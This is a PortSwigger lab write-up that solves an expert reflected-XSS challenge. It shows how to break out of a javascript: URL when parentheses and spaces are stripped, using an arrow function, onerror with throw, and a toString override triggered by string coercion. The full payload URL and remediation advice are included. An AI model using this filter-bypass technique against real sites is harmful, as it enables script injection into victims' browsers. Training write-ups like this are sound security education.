# Lab: Reflected XSS in a JavaScript URL with some characters blocked

## Overview

- **Category:** Cross-Site Scripting (Reflected XSS / JavaScript URL Context / Filter Bypass)
- **Difficulty:** Expert
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This Expert-level lab reflects the current blog post URL inside a `javascript:` URL in the "Back to Blog" anchor tag (`<a href="javascript:fetch(...)">`). Although single quotes (`'`) are not escaped—allowing us to break out of the string literal inside the `fetch()` call—the application strips all parentheses (`(` and `)`) and spaces from the input. By combining single-argument arrow functions (`x=>...`), multi-line comments (`/**/`) as space substitutes, the global `onerror` exception handler with `throw`, and implicit string type coercion (`toString=x, window+''`), we invoke `alert(1337)` without using a single parenthesis or space character.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1337) when the victim visits the crafted post URL / clicks "Back to Blog"
      ↓
VICTIM / DELIVERY
  User visiting the crafted `/post?postId=...` URL
      ↓
SOURCE
  URL query string appended to `/post?postId=2&...`
      ↓
CONTEXT & FILTER ANALYSIS
  The server reflects the URL inside the "Back to Blog" link:
  <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
  - Single quotes (`'`) are reflected unescaped!
  - Parentheses (`(` and `)`) are completely stripped.
  - Spaces are blocked/stripped.
      ↓
INJECTION (Parenthesisless & Spaceless JS Execution Chain)
  1. Break out of `body:'...'` and the options object `{...}` using `&'}`.
  2. Define a single-argument arrow function without parentheses:
     `x=x=>{throw/**/onerror=alert,1337}`
     - `/**/` acts as a whitespace separator after `throw`.
     - The comma operator assigns `onerror=alert` and throws `1337` to it.
  3. Overwrite `window.toString` with our function `x`:
     `toString=x`
  4. Trigger implicit string coercion on `window` without parentheses:
     `window+''` (calls `window.toString()`, which invokes `x`).
  5. Cleanly repair the trailing `'})` syntax with `,{x:'`.
      ↓
SINK
  The `href="javascript:fetch(...)"` attribute on the "Back to Blog" link.
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1337)`) → Expert Lab Solved!
```

---

## Step-by-Step Walkthrough

### 1. Inspecting the Reflection Context and Filter Behavior
Opened a blog post (`/post?postId=2`) and inspected the **Back to Blog** link at the bottom of the page:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Probed the filter by appending `&'()test` to the URL (`/post?postId=2&'()test`). The response returned:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26'test'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Key observations:
- The single quote `'` is not encoded or escaped, breaking out of the `body` string literal.
- Both parentheses `(` and `)` were stripped from the output.
- Spaces are also rejected/stripped.

### 2. Building the Parenthesisless Payload
To execute `alert(1337)` inside the `fetch(...)` argument list without parentheses or spaces:

1. **Break out of the object literal:** `&'}` closes `body:'...'` and `{method:'post', ...}`, placing us inside the comma-separated argument list of `fetch()`.
2. **Create a function without `()`:** Single-parameter arrow functions in ES6 (`x=>{...}`) do not require parentheses around their parameter list.
3. **Call `alert(1337)` via `onerror` and `throw`:**
   ```javascript
   x=x=>{throw/**/onerror=alert,1337}
   ```
   Using `/**/` instead of a space after `throw`, the comma operator sets `window.onerror = alert` and throws `1337` as an uncaught exception, which invokes `alert(1337)`.
4. **Trigger the function `x` without `()`:**
   ```javascript
   ,toString=x,window+'',{x:'
   ```
   Assigning `toString = x` and evaluating `window + ''` forces the JavaScript engine to implicitly call `window.toString()` during string concatenation, executing `x` immediately when `fetch()` evaluates its arguments.

### 3. Executing the Exploit
Navigated to the crafted URL:

```text
https://LAB-HOST/post?postId=2&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

This rendered the following valid JavaScript inside the `href` attribute:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
```

Clicking **Back to Blog** (and the lab's background victim verification) triggered `alert(1337)` and solved the lab.

---

## Key Takeaways & Remediation

### Why Stripping `(` and `)` Does Not Prevent JavaScript Execution
JavaScript offers multiple ways to invoke functions and pass arguments without parentheses, including tagged template literals (``alert`1` ``), setter/getter property access, implicit type coercion (`toString` / `valueOf` triggered by `+` or template interpolation), and global exception handlers (`onerror=alert; throw 1337`).

### Remediation
- **Never Construct `javascript:` URLs from Untrusted Input:** Attach event handlers via `addEventListener` and pass data through `data-*` attributes or `JSON.parse()`.
- **Proper Context-Aware Encoding:** If embedding values into a JavaScript string inside an HTML attribute, apply both JavaScript string escaping (`\'`, `\\`) and HTML attribute encoding (`&quot;`, `&#x27;`).
